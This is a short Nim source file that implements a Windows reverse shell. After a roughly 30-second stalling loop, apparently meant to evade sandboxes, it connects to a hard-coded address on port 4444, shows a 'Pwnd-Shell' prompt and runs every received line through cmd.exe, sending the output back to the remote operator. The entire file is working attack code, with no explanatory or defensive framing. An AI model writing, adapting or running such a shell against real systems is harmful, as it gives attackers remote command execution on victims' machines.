import net, osproc, strformat, times

let delay1 = delay() + 30.seconds
var i = 1

while delay() <= delay1:
  var i = i + 1
  
let 
  ip = "192.168.183.130"
  port = 4444
  socket = newSocket()
  
socket.connect(ip, Port(port))

let propmt = "Pwnd-Shell> "
while true:
  send(socket, propmt)
  let bad = recvLine(socket)
  let cmd = execProcess(fmt"cmd.exe /C " & bad)
  send(socket, cmd) 
